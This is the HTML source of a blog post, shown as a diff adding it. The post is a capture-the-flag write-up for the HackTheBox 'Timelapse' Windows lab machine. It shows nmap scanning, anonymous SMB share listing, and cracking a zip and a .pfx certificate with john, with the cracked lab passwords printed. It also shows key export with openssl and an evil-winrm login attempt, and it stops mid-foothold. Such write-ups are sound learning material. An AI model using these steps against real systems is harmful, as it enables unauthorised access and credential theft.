@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='I struggle with another medium box'><title>Timelapse</title>
+
+<link rel='canonical' href='https://www.phireheavyindustries.com%22/p/timelapse/'>
+
+<link rel="stylesheet" href="/scss/style.min.d9e0562edde3d2bdf9d3d81365095a29d062ddaaa5d671f22168e57dfdb18b4f.css"><meta property='og:title' content='Timelapse'>
+<meta property='og:description' content='I struggle with another medium box'>
+<meta property='og:url' content='https://www.phireheavyindustries.com&#34;/p/timelapse/'>
+<meta property='og:site_name' content='phire heavy industries'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='privesc' /><meta property='article:tag' content='flag' /><meta property='article:tag' content='root' /><meta property='article:tag' content='writeup' /><meta property='article:tag' content='tryhackme' /><meta property='article:tag' content='easy' /><meta property='article:tag' content='windows' /><meta property='article:published_time' content='2022-05-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-22T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Timelapse">
+<meta name="twitter:description" content="I struggle with another medium box">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/10_huaf8374600aea688da2b9275ce86cd12a_155910_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">phire heavy industries</a></h1>
+            <h2 class="site-description">i never know what to write on these things</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://www.facebook.com/phireheavyindustries'
+                        target="_blank"
+                        title="facebook"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/phireheavy'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/phireheavy'
+                        target="_blank"
+                        title="Twitter"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About me</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hackthebox/" >
+                hackthebox
+            </a>
+        
+            <a href="/categories/writeup/" >
+                writeup
+            </a>
+        
+            <a href="/categories/windows/" >
+                windows
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/timelapse/">Timelapse</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            I struggle with another medium box
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 22, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    7 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="assessment">assessment</h3>
+<h2 id="enumeration">Enumeration</h2>
+<h2 id="nmap">nmap</h2>
+<p>Has to run with -Pn</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ nmap -Pn 10.10.11.152 -sV -oA initial_nmap --script vuln
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-03 13:08 EDT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.152
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host is up (0.23s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Not shown: 989 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-04 01:27:59Z)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">636/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">|_ssl-ccs-injection: No reply from server (TIMEOUT)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">|_ssl-ccs-injection: No reply from server (TIMEOUT)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">|_smb-vuln-ms10-054: false
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="smb">smb</h2>
+<p>As this is most likely a windows server, i&rsquo;m going to try to connect with smbclient and list shares with a blank password</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ smbclient -L 10.10.11.152
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enter WORKGROUP\kali&#39;s password:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    ---------       ----      -------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    C$              Disk      Default share
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    NETLOGON        Disk      Logon server share
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Shares          Disk      
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    SYSVOL          Disk      Logon server share
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 for workgroup listing.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Listing the <strong>Shares</strong> folder reveals a couple of subfolders, with a zip, some documents and a .msi installer. The zip is password protected. The other shares are password protected.</p>
+<p>While i do some research i&rsquo;ll try to crack the zip file. Seems it would be too easy but i&rsquo;ll try anyway</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ zip2john winrm_backup.zip &gt; hash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ john hash            
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Loaded 1 password hash (PKZIP [32/64])
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Will run 2 OpenMP threads
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Proceeding with single, rules:Single
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Almost done: Processing the remaining buffered candidate passwords, if any.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Proceeding with wordlist:/usr/share/john/password.lst
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Proceeding with incremental:ASCII
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Zip can ben opened with <em>supremelegacy</em>. Inside there is a .pfx file. I&rsquo;ll try to open this again with john.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ john pfxhash --wordlist=~/Downloads/Wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cost 1 (iteration count) is 2000 for all loaded hashes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Will run 2 OpenMP threads
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">thuglegacy       (legacyy_dev_auth.pfx)    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1g 0:00:01:50 DONE (2022-04-03 14:01) 0.009077g/s 29332p/s 29332c/s 29332C/s thuglife06..thug211
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Again, john finds the password. Let&rsquo;s try to export the content of the PFX file</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out certificate.pem    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We now have a couple of keys that hopefully will allow us access.  I also tried to open the PFX file as text and was able to see a possible login <strong><a class="link" href="mailto:legacyy@timelapse.htb" >legacyy@timelapse.htb</a></strong>. Some more enumeration shows that port 5986 is open which corresponds to winrm with ssl authentication. The hints in the HTB board also show that this might a possible foothold.</p>
+<p>I got a little nudge on the HTB discord. Apparently i&rsquo;m doing this the correct way, and winrm is the way in. There are a bunch of winrm exploiting tools but the most popular seems to be <a class="link" href="https://github.com/Hackplayers/evil-winrm"  target="_blank" rel="noopener"
+    >Evil-winrm</a> which i apparently tried with the correct command. The error that is returned points to something wrong with the certificate, so i&rsquo;ll retry exporting the private and public keys again.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i 10.10.11.152 -k p
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Error: An error of type OpenSSL::X509::CertificateError happened, message is nested asn1 error
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Error: Exiting with code 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="foothold">Foothold</h2>
+<p>I was indeed missing a step in exporting the keys from the .pfx file. The full sequence of commands is the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out timelapse.pem -nodes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enter Import Password:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokey -out cert.pem
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pkcs12: Unrecognized flag nokey
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pkcs12: Use -help for summary.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enter Import Password:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/HTB/Timelapse]
